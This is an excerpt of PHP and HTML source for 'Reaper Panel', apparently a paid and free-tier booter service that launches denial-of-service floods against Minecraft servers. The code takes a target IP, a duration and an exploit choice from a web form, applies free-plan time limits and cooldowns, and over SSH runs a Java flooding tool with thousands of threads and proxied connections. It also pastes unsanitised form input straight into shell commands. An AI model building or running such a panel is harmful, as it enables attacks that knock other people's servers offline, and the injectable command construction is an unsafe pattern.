...
<html>
<head>
  <title>Reaper Panel | Crash Hub</title>
...
<div class="blacklist_text">
    <h1><strong>REAPER HUB</strong></h1>
</div>
...
if ($status->online == 1) {
  if ($_POST['vreme'] <= '30') {
    if ($_POST['admin'] == 'freeplan'){
      $file = 'cooldown.txt'; // the name of the text file (must be writeable by the server)
      $orderNumber = file_get_contents ($file); // read file data and store as variable
      $fdata = intval($orderNumber); // increment the value

      $file2 = 'cooldown2.txt'; // the name of the text file (must be writeable by the server)
      ...
      if ($fdata < 2) {
        ...
        $cmds = array ('', 'screen -dms bot java -jar Blacklist.jar srvResolve2=true keepAlive=true attackTime=' .$_POST["vreme"]. ' proxiesType=socks alwaysResolve=false threads=11000 timeout=2500 print=true multi=true proxiesFile=sokcs.txt host=' .$_POST["ip"]. ' port=25565 removeFailure=true exploit=' .$_POST["select_catalog"].' connections=5000 loopAmount=1');
        ...
        $connection = ssh2_connect('xx.xxx.xxx', 22);
        ...
        $cmds = array ('', 'screen -dms bot java -jar Blacklist.jar srvResolve2=true keepAlive=true attackTime=' .$_POST["vreme"]. ' proxiesType=socks alwaysResolve=false threads=3000 timeout=2500 print=true multi=true proxiesFile=sokcs.txt host=' .$_POST["ip"]. ' port=25565 removeFailure=true exploit=' .$_POST["select_catalog"].' connections=5000 loopAmount=1');
        ...
        exec('screen -dms php php -f /var/www/cooldown.php');
    ...
    echo '<span style="color:white;text-align:center;"><center>Free attacks can not be longer then 30s!</center></span>';
    return;
  }
}
...
window.location.replace("https://reaperpanel.gq/index.php");
  } else {
